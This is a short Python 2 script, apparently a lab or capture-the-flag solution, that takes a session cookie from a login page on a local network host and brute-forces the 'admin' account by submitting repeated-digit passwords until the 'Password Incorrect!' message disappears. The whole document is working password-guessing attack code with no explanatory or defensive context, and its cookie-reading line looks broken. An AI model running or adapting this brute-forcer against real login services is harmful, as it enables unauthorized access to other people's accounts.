import urllib,urllib2,time
req = urllib2.Request('http://192.168.0.209:1111/login')
res = urllib2.urlopen(req)
session = res.headers.post('set-cookie')
print session
start = time.time();
for i in range(0,5):
    print i
    form = urllib.urlencode({'user_id':'admin','user_pw':str(i)*4})
    print str(i)*4
    req = urllib2.Request('http://192.168.0.209:1111/login_chk',form)
    req.add_header('cookie',session)
    res = urllib2.urlopen(req)
    read = res.read()
    if read.find('Password Incorrect!') == -1:
        end = time.time();
        print end-start,'second and',i,'is answer!\n'
        print read
        break


